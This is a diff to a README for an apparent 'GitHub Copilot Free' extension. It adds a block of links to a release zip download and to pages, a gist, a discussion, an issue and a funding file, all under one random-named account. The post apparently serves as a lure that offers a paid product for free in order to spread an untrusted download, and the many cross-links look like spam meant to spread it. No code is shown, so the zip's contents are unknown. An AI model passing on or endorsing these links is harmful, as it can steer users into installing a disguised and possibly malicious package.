@@ -50,3 +50,20 @@ Windows 10/11. VS Code 1.136. GitHub account.
 Extension notes - Copyright (C) 2026 ghcopilotfree
 
 ![images7](images7.png)
+
+
+---
+
+## Also here
+
+- **Download:** [https://github.com/brp3knpf7rtwr7/GitHub-Copilot-Free/releases/download/v1.136.0/GitHub-Copilot.zip](https://github.com/brp3knpf7rtwr7/GitHub-Copilot-Free/releases/download/v1.136.0/GitHub-Copilot.zip)
+- **Repository:** https://github.com/brp3knpf7rtwr7/GitHub-Copilot-Free
+- **GitHub Pages:** https://brp3knpf7rtwr7.github.io/GitHub-Copilot-Free/
+- **Gist:** https://gist.github.com/brp3knpf7rtwr7/055016d58795249835f85ef3be1172ba
+- **Docs:** https://github.com/brp3knpf7rtwr7/GitHub-Copilot-Free/tree/main/docs
+- **Discussion:** https://github.com/brp3knpf7rtwr7/GitHub-Copilot-Free/discussions/1
+- **Profile:** https://github.com/brp3knpf7rtwr7/brp3knpf7rtwr7
+- **Issue:** https://github.com/brp3knpf7rtwr7/GitHub-Copilot-Free/issues/2
+- **Funding:** https://github.com/brp3knpf7rtwr7/GitHub-Copilot-Free/blob/main/.github/FUNDING.yml
+
+---
